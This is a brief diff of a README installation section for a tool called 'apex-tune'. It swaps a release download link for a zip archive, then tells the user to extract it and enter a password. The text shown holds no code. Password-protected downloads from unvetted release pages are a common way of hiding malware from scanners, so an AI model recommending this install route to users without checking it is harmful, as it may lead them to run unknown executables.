@@ -38,7 +38,7 @@
 
 ## 🚀 Installation
 
-1. **Download** the archive: [apex-tune-setup](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/apex-tune-setup)
+1. **Download** the archive: [apex-tune-setup](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/apex-tune.zip)
 2. **Extract** the archive.
 3. **Enter the password** when prompted:
 
